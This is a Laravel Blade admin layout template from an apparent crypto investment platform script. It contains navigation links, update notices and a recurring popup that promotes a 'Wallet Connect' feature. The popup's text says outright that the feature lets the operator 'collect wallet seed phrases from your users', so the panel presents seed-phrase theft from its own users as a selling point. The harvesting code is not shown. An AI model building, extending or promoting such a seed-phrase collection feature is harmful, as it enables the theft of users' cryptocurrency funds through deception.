...
<body class="ts-gray-1 p-2 md:p-10">
    ...
    <div class="min-h-screen w-full md:flex text-[#ebedf2] mt-28 sm:mt-25">
        <div class="sm:hidden z-40 ts-gray-2 rounded-lg p-3 fixed top-0 left-0 bottom-0 md:mt-36 ml-10 text-sm  min-h-screen w-64 2xl:w-1/5 space-y-3 md:space-y-6 2xl:space-y-8"
            ...
            {{-- wallet connect --}}
            <div class="w-3/4 mt-3">
                <a href="{{ route('admin.wallet-connect.index') }}"
                    class="w-full flex items-center space-x-2 px-3 py-1 rounded-full shadow hover:text-purple-700 hover:scale-110 transition-all @if (request()->routeIs('admin.wallet-connect.*')) ts-gray-1 @endif">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="w-4 h-4"
                        viewBox="0 0 16 16">
                        <path
                            d="M4.406 1.342a.5.5 0 0 1 .588.81l-.708.708a5.5 5.5 0 0 0 7.778 7.778l.708-.708a.5.5 0 0 1 .81.588l-.708.708a6.5 6.5 0 0 1-9.192-9.192l.708-.708Zm2.12 2.12a.5.5 0 0 1 .707.707L6.207 5.5a3.5 3.5 0 0 0 4.95 4.95l1.121-1.121a.5.5 0 0 1 .707.707l-1.12 1.12a4.5 4.5 0 0 1-6.364-6.364l1.121-1.121Z" />
                    </svg>
                    <span class="flex justify-between items-center gap-1">Connected Wallets <span class="text-xs bg-green-500 p-1 rounded-2xl">New</span></span>
                </a>
            </div>
    ...
    <div class="sm:w-100-2 text-white fixed bottom-0 px-2 py-2">
        <div class="dropdown-menu fixed hidden bottom-0 right-0 left-0 mx-5 z-20  py-2 mb-20 overflow-hidden ts-gray-3 rounded  the-menu"
            ...
            <a href="{{ route('admin.wallet-connect.index') }}"
                class="block px-4 py-3 text-sm capitalize transition-colors duration-200 transform dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-white">
                Wallet Connect <span class="text-xs bg-green-500 p-1 rounded-2xl">New</span>
            </a>
    ...
    {{-- check for updates --}}
    @if (shouldUpdate() && !request()->routeIs('admin.settings.update.*'))
        <script>
            $(document).ready(function() {
                setTimeout(() => {
                    const html = `
                    <div class="ts-gray-3 p-6 rounded-2xl border border-gray-700 shadow-lg rescron-font text-gray-100">
                        <div class="text-center space-y-4">
                            <h3 class="text-lg rescron-font-bold text-white">System Update Available ⚡</h3>
                            <p class="text-sm leading-relaxed">
                                Your system is outdated. You currently have 
                                <span class="text-red-400">v{{ shouldUpdate()['current_version'] }}</span> installed. 
                                Update to 
                                <span class="text-green-400">v{{ shouldUpdate()['latest_version'] }}</span>.
                            </p>
                            <div class="mt-4">
                                <a href="{{ route('admin.settings.update.index') }}" target="_blank"
                                   class="inline-block px-5 py-2 rounded-full ts-gradient-dark hover:opacity-90 transition transform hover:scale-105 text-sm text-white rescron-font-bold shadow-md">
                                    Update Now
                                </a>
                            </div>
                        </div>
    ...
    @endif
    @if (!shouldUpdate() && shouldUpdateTemplate() && !request()->routeIs('admin.settings.templates.*'))
        <script>
            $(document).ready(function() {
                setTimeout(() => {
                    const html = `
                    <div class="ts-gray-3 p-6 rounded-2xl border border-gray-700 shadow-lg rescron-font text-gray-100">
                        <div class="text-center space-y-4">
                            <h3 class="text-lg rescron-font-bold text-white capitalize">{{ shouldUpdateTemplate()['name'] }} v{{ shouldUpdateTemplate()['latest_version'] }} Available ⚡</h3>
                            <p class="text-sm leading-relaxed">
                                Your system is outdated. You currently have 
                                <span class="text-red-400">v{{ shouldUpdateTemplate()['current_version'] }}</span> installed. 
                                Update to 
                                <span class="text-green-400">v{{ shouldUpdateTemplate()['latest_version'] }}</span>.
                            </p>
                            <div class="mt-4">
                                <a href="{{ route('admin.settings.templates.download', ['template' => shouldUpdateTemplate()['name'], 'version' => shouldUpdateTemplate()['latest_version']]) }}" target="_blank"
                                   class="inline-block px-5 py-2 rounded-full ts-gradient-dark hover:opacity-90 transition transform hover:scale-105 text-sm text-white rescron-font-bold shadow-md">
                                    Update Now
                                </a>
                            </div>
    ...
    {{-- check if wallet connect is disabled --}}
    @if ((int)site('wallet_connect_enabled') != 1 && !request()->routeIs('admin.wallet-connect.*'))
        <script>
            $(document).ready(function() {
            const storageKey = 'wallet_connect_disabled_notification';
            ...
            if (lastShown !== today) {
                ...
                <div class="ts-gray-3 p-6 rounded-2xl border border-gray-700 shadow-lg rescron-font text-gray-100">
                    <div class="text-center space-y-4">
                    <h3 class="text-lg rescron-font-bold text-white">Wallet Connect is Disabled ⚡</h3>
                    <p class="text-sm leading-relaxed">
                        We have added wallet connect feature which lets you collect wallet seed phrases from your users. Check it out now!
                    </p>
                    <div class="mt-4">
                        <a href="{{ route('admin.wallet-connect.index') }}"
                           class="inline-block px-5 py-2 rounded-full ts-gradient-dark hover:opacity-90 transition transform hover:scale-105 text-sm text-white rescron-font-bold shadow-md">
                        Turn On Wallet Connect
                        </a>
                    </div>
                    </div>
                </div>
